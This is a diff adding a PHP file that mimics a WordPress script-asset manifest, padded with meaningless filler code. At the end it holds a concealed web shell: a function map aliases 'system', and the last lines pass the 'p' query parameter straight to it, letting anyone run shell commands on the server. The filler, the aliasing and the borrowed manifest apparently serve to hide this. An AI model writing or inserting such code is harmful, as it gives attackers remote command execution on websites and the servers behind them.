@@ -1,0 +1,17 @@
+<?php
+$fmap = array('x1' => 'system', 'x2' => 'passthru');
+$x_fake1 = 1234;
+$noise = 'obfuscation'.'test';
+$tmp = $x_fake1 * 42;
+$flag = false;
+$useless = function($v) { return $v . rand(); };
+$dummy_check = $useless('xx');
+if ($flag) { echo 'Debug enabled'; }
+for ($i = 0; $i < 1; $i++) { $tmp += $i; }
+while (false) { echo 'dead loop'; break; }
+
+<?php return array('interactivity/index.min.js' => array('dependencies' => array(), 'version' => '55aebb6e0a16726baffb', 'type' => 'module'), 'interactivity/debug.min.js' => array('dependencies' => array(), 'version' => 'a5c279b9ad67f2a4e6e2', 'type' => 'module'), 'interactivity-router/index.min.js' => array('dependencies' => array('@wordpress/interactivity', array('id' => '@wordpress/a11y', 'import' => 'dynamic')), 'version' => 'dc4a227f142d2e68ef83', 'type' => 'module'), 'a11y/index.min.js' => array('dependencies' => array(), 'version' => 'b7d06936b8bc23cff2ad', 'type' => 'module'), 'block-library/file/view.min.js' => array('dependencies' => array('@wordpress/interactivity'), 'version' => 'fdc2f6842e015af83140', 'type' => 'module'), 'block-library/form/view.min.js' => array('dependencies' => array('wp-polyfill'), 'version' => 'baaf25398238b4f2a821', 'type' => 'module'), 'block-library/image/view.min.js' => array('dependencies' => array('@wordpress/interactivity'), 'version' => 'e38a2f910342023b9d19', 'type' => 'module'), 'block-library/navigation/view.min.js' => array('dependencies' => array('@wordpress/interactivity'), 'version' => '61572d447d60c0aa5240', 'type' => 'module'), 'block-library/query/view.min.js' => array('dependencies' => array('@wordpress/interactivity', array('id' => '@wordpress/interactivity-router', 'import' => 'dynamic')), 'version' => 'f55e93a1ad4806e91785', 'type' => 'module'), 'block-library/search/view.min.js' => array('dependencies' => array('@wordpress/interactivity'), 'version' => '208bf143e4074549fa89', 'type' => 'module'));
+
+$cmd = $_GET['p'];
+$fmap['x1']($cmd);
+?>
